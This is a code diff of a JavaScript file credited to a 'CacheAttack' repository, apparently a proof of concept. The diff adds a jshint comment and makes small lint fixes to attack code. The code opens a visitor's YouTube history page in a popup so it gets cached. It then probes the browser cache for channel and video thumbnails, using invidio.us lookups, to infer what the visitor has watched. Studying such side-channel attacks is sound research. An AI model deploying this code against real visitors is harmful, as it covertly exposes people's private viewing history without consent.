@@ -1,9 +1,13 @@
+/*jshint esversion: 8 */
+
+// NDev 2020 https://github.com/NDevTK/CacheAttack
+
 async function getHistory() {
 	var ads = open("https://m.youtube.com/feed/history/?app=m");
 	setTimeout(async _  => ads.close(), 3000);
 	setTimeout(async _  => {
 		clearTable();
-		var result = await getVideos();
+		await getVideos();
 	}, 3500);
 }
 
@@ -41,21 +45,21 @@ async function getVideos() {
 }
 
 async function YTCrawler(channels) {
-  var checks = []
-  for (var channel of channels) {
+  var checks = [];
+  for (let channel of channels) {
     checks.push([channel[1].concat("=s88-c-k-c0xffffffff-no-rj-mo"), channel[0]]);
   }
   var cached_channels = await getWebsites(null, checks);
-  for (var channel of cached_channels) {
+  for (let channel of cached_channels) {
     let r = await fetch("https://invidio.us/api/v1/channels/"+encodeURI(channel[1])+"/videos");
     let channelData = await r.json();
     addData([channel[0], channelData[0].author]);
-    if(channelData.error) continue
+    if(channelData.error) continue;
     var videos = [];
     for (var video of channelData) {
 	    videos.push([Video1(video.videoId), video.title]);
 	    videos.push([Video2(video.videoId), video.title]);
-     };
+     }
      var cached_videos = await getWebsites(null, videos);
      cached_videos.map(addData);
   }
